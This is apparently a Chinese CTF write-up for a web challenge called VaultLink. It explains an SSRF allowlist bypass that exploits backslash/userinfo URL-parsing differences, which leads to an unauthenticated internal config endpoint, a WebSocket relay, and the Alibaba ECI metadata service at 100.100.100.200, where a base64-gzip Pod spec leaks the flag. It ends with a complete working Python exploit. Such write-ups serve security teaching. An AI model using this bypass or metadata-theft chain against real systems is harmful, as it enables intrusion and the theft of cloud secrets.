# VaultLink（合作方网关）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | Web |
| 形态 | 容器（Docker，需初始化） |
| 附件 | 无 |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}


## 2. 题目分析

### 网关路由与唯一入口

容器只暴露一个合作方网关端口，对外可见的路由很少：

| 路由 | 作用 |
| --- | --- |
| `GET /` | 合作方门户首页，HTML注释里有staging假flag |
| `GET /docs` | 网关接口说明 |
| `GET /api/proxy?url=<upstream-url>` | 反向代理，按合作方身份代取上游资源 |
| `GET /.git/config` | 源码仓库残留，泄露staging配置 |

真正承载业务的是`/api/proxy`：它从查询串取出`url`参数，做三项检查后向目标发起请求，再把上游的状态码、响应头与响应体原样回显，并在页面上标注本次实际连接的`host:port`。这个「回显实际连接目标」的设计本意是方便合作方排障，却正好成了验证SSRF是否命中的观测点。

检查项只有三条：

- 仅允许`http`/`https`scheme；
- 主机必须命中合作方白名单（本题白名单主机为`rates.partner-forex.example.com`）；
- 目标不得为空。

关键缺陷在于：这三条只作用在「URL字符串解析出的主机名」上，既没有把域名解析成IP后再核对，也没有限制端口，更没有在出站方向做egress过滤。因此只要能让「校验时看到的主机」与「socket真正连向的主机」不是同一个，白名单就形同虚设。

`/docs`还专门提示「v1合作方把凭据放在URL authority(userinfo)」，这句话是在暗示authority段里`user:pass@host`的切分规则，也就是`@`之前的内容会被当作凭据丢弃——这正是后面解析差异的利用面。

### 两层解析差异：反斜杠与userinfo

URL的authority段`//userinfo@host:port`本身就有歧义：`@`是userinfo与host的分界，且以最后一个`@`为准。不同实现对此的处理并不一致：

- 校验侧按「host只由合法域名字符组成」来截取，遇到`\`就认为主机名结束，于是`rates.partner-forex.example.com\@127.0.0.1:31337`解析出的host是`rates.partner-forex.example.com`，命中白名单；
- 连接侧走的是另一套规范化：`\`被当作userinfo的合法组成字符，直到`@`才切分，于是userinfo变成`rates.partner-forex.example.com\`，真正的host变成`127.0.0.1`、端口变成`31337`。

同一个字符串，一边认为要去`rates.partner-forex.example.com`，另一边实际连`127.0.0.1:31337`。校验发生在解析结果A上，连接发生在解析结果B上，中间没有任何一次「连接前复核解析后的IP与端口」，这就是漏洞成立的全部原因。

### 校验目标与连接目标的错位

把这个差异代入三条检查：

- scheme检查看的是字符串前缀`http://`，成立；
- 白名单检查看的是截断后的host，成立；
- 端口从未被检查，`31337`、`8081`、`80`都放行。

于是受限代理退化成「任意内网host:port的GET客户端」：回环地址、容器网段、链路本地地址全部可达，且响应体会被完整带回。这就是后面能直达`127.0.0.1`上的维护端口和`100.100.100.200`上的云元数据的原因。

### 内网服务布局：31337与8081

绕过白名单后，回环上测绘到两个服务：

- `127.0.0.1:31337`是网关自身的维护端口，`/config`返回JSON：`service`、`vault_session_seed`（64位十六进制，随实例动态生成）、`relay_endpoint`（`127.0.0.1:8081/ws`）以及`note: internal maintenance endpoint - do not expose`。它没有任何鉴权，只要能连到回环就能读。
- `127.0.0.1:8081/ws`是内部relay，走WebSocket。握手成功后先下发两行问候：`SESSION <16位十六进制随机数>`与`READY guest`；首个数据帧必须用`IDENT <该SESSION值>`完成会话绑定，回执`OK session-bound`，之后才会响应`HELP`/`BALANCE`/`AUTH`/`DIAG`等指令。

relay的鉴权设计是「合作方会话只能识别、不能认证」：即使拿到了`/config`里的seed，从合作方连接发`AUTH admin <seed>`也只会得到`ERR auth-console-only`，管理帧被拦在网关这一层。这一步说明seed虽然后续可能用于管理面，但它本身不是取flag的钥匙；真正可用的攻击面仍是SSRF能打到哪些地址。

### 云元数据：100.100.100.200

容器运行在阿里云ECI上。ECI的元数据服务不在常见的`169.254.169.254`，而是`100.100.100.200`，由节点侧提供给Pod网络命名空间内的进程访问，不需要任何凭据，也不需要额外网络策略放通——它天生就在Pod的可达范围内。由于网关出站没有任何egress限制，SSRF可以直接打过去。

元数据接口中`/latest/user-data`返回的是实例的user-data，ECI在这里存放的是base64编码后再gzip压缩的Pod spec。Pod spec里`containers[].env`会列出注入的环境变量，本题的flag正是以`ICQ_FLAG`注入，因此解码Pod spec即可直接读到flag值，无需在容器内执行命令，也绕开了`/flag`文件的权限限制。

## 3. 解题过程

### 验证校验与连接分离

先用回环地址做对照，确认白名单确实在拦：

```http
GET /api/proxy?url=http://127.0.0.1:31337/   -> 403 host not in partner allowlist
```

再在白名单主机后接`\@`与真实目标，反斜杠写成`%5C`：

```http
GET /api/proxy?url=http://rates.partner-forex.example.com%5C@127.0.0.1:31337/config  -> 200
```

`%5C`是查询串里的URL编码。网关取出`url`参数后会先做一次百分号解码，解码结果仍是含`\`的原始URL；之所以不直接写`\`，是因为部分客户端与中间层会先按路径规则把反斜杠归一化成`/`，编码后可以保证到达网关时字符原样保留。

之所以能通，是因为校验函数只截取`\`之前的部分做白名单比对，看到的是`rates.partner-forex.example.com`；而真正建连的HTTP客户端把`\`吞进userinfo，host取`127.0.0.1`、port取`31337`。响应`200`且正文是维护接口的JSON，说明请求确实落在了回环的维护端口上，而不是白名单主机。

### 读取维护接口拿到seed与relay地址

同一条绕过路径请求`/config`，返回：

```json
{
  "service": "vaultlink-gateway",
  "vault_session_seed": "7a5b63f1...(64位十六进制，逐实例变化)",
  "relay_endpoint": "127.0.0.1:8081/ws",
  "note": "internal maintenance endpoint - do not expose"
}
```

这一步能成立有两个条件：一是`/config`本身不做鉴权，设计上假定「只有本机能访问」；二是请求由网关进程自己发出，源地址就是`127.0.0.1`，维护端口看到的确实是本机流量，因此不会拒绝。网关的SSRF把「外部合作方」伪装成了「本机运维」。

### 核对relay协议，确认seed的作用边界

用同样的形式把WebSocket升级请求代理到`8081/ws`：`/api/proxy?url=`指向`http://rates.partner-forex.example.com%5C@127.0.0.1:8081/ws`，并带上`Connection: Upgrade`、`Upgrade: websocket`、`Sec-WebSocket-Version: 13`与随机的`Sec-WebSocket-Key`。网关会把这些头原样转发，上游回`101`，随后下发：

```text
SESSION 3f9c...（16位十六进制，每次连接不同）
READY guest
```

按协议先回`IDENT <SESSION值>`，得到`OK session-bound`；再发`HELP``AUTH admin <seed>`与`DIAG <expr>`。但直接发`AUTH admin <seed>`会收到：

```text
ERR auth-console-only (partner sessions cannot authenticate)
```

这说明relay按会话来源区分权限：从`/api/proxy`进来的连接固定是guest，seed只对ops console这类管理连接有效。因此seed与relay协议在这里只用于确认内网服务形态与`relay_endpoint`，并不构成取得flag的路径；flag仍要从容器外部沿继续可达的地址取。

### 用SSRF访问云元数据

既然是任意内网SSRF，下一步就是把目标换成云厂商元数据。本环境是阿里云ECI，元数据地址是`100.100.100.200`：

```http
GET /api/proxy?url=http://rates.partner-forex.example.com%5C@100.100.100.200/latest/user-data
```

请求成立的原因有三点：白名单只比对字符串，`100.100.100.200`以userinfo形式出现不影响校验；网关不做egress限制，Pod网络命名空间内到元数据服务的链路天然可达；元数据接口本身不校验任何凭据，只按来源IP响应。常见的`169.254.169.254`在该环境不可达，如果只试这个地址会误判为「没有元数据」。

返回体是一段base64文本，对应ECI存放的user-data。

### 解码Pod spec取得flag

把返回体按base64解码再gunzip，得到明文Pod spec：

```bash
base64 -d user-data.b64 | gunzip
```

顺序不能颠倒：元数据返回的是base64字符串，解base64后才是gzip字节流，gunzip之后才是YAML。Pod spec中与flag相关的片段形如：

```yaml
spec:
  containers:
  - name: vaultlink-relay
    env:
    - name: ICQ_FLAG
      value: <平台注入的flag值>
```

`env`里的`ICQ_FLAG`就是平台注入容器的flag值，与容器内`/flag`内容一致。至此不需要在容器里执行任何命令，也不需要relay的管理权限，整条链闭合：

```text
/api/proxy反斜杠白名单绕过SSRF → 阿里云ECI元数据100.100.100.200/latest/user-data → base64 -d | gunzip → Pod spec的ICQ_FLAG → flag
```

## 4. PoC

```python
#!/usr/bin/env python3
import sys, os, re, json, gzip, base64, socket
from urllib.parse import urlparse

TARGET = sys.argv[1]                       # 合作方网关
ALLOW = "rates.partner-forex.example.com"  # 白名单主机

def conn():
    u = urlparse(TARGET if "://" in TARGET else "http://" + TARGET)
    return socket.create_connection((u.hostname, u.port or 80), timeout=10), u.hostname

def bypass(host, port, path):
    # 校验侧取 \ 之前的主机名命中白名单；连接侧把 \ 并入 userinfo，实际连 host:port
    return f"/api/proxy?url=http://{ALLOW}%5C@{host}:{port}{path}"

def get(host, port, path):
    s, name = conn()
    s.sendall((f"GET {bypass(host, port, path)} HTTP/1.1\r\nHost: {name}\r\n"
               "Connection: close\r\n\r\n").encode())
    data = b""
    while chunk := s.recv(65536):
        data += chunk
    s.close()
    head, _, body = data.partition(b"\r\n\r\n")
    if b"chunked" in head.lower():
        out = b""
        while True:
            line, _, body = body.partition(b"\r\n")
            n = int(line.split(b";")[0] or b"0", 16)
            if not n:
                break
            out, body = out + body[:n], body[n + 2:]
        body = out
    return body.decode("utf-8", "replace")

# 1) 31337 维护端口：无鉴权读取 seed 与 relay 地址
cfg = json.loads(re.search(r"\{.*\}", get("127.0.0.1", 31337, "/config"), re.S).group(0))
seed, relay = cfg["vault_session_seed"], cfg["relay_endpoint"]

# 2) 8081 relay：经网关升级 WebSocket，按 SESSION 绑定会话
rhost, rport = relay.split("/")[0].rsplit(":", 1)
s, name = conn()
s.sendall((f"GET {bypass(rhost, int(rport), '/ws')} HTTP/1.1\r\nHost: {name}\r\n"
           "Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\n"
           "Sec-WebSocket-Version: 13\r\n\r\n").encode())
raw = b""
while b"\r\n\r\n" not in raw:
    raw += s.recv(4096)
buf = bytearray(raw.partition(b"\r\n\r\n")[2])

def frame(op, payload):
    mask, data = os.urandom(4), bytearray(payload)
    for i in range(len(data)):
        data[i] ^= mask[i % 4]
    return bytes([0x80 | op, 0x80 | len(data)]) + mask + bytes(data)

def recv_frame():
    while len(buf) < 2 or len(buf) < 2 + (buf[1] & 0x7F):
        buf.extend(s.recv(4096))
    n = buf[1] & 0x7F
    payload = bytes(buf[2:2 + n])
    del buf[:2 + n]
    return payload.decode("utf-8", "replace")

greet = ""
while "READY" not in greet:
    greet += recv_frame() + "\n"
sid = re.search(r"SESSION (\w+)", greet).group(1)
s.sendall(frame(1, f"IDENT {sid}".encode()))
print("relay:", recv_frame().strip())

# 3) 云元数据 100.100.100.200：取 ECI user-data 中的 Pod spec 并解码
b64 = get("100.100.100.200", 80, "/latest/user-data").strip()
spec = base64.b64decode(b64)
spec = gzip.decompress(spec) if spec[:2] == b"\x1f\x8b" else spec
print(re.search(r"ICQ_FLAG\s*\n\s*value:\s*(\S+)", spec.decode()).group(1))
```
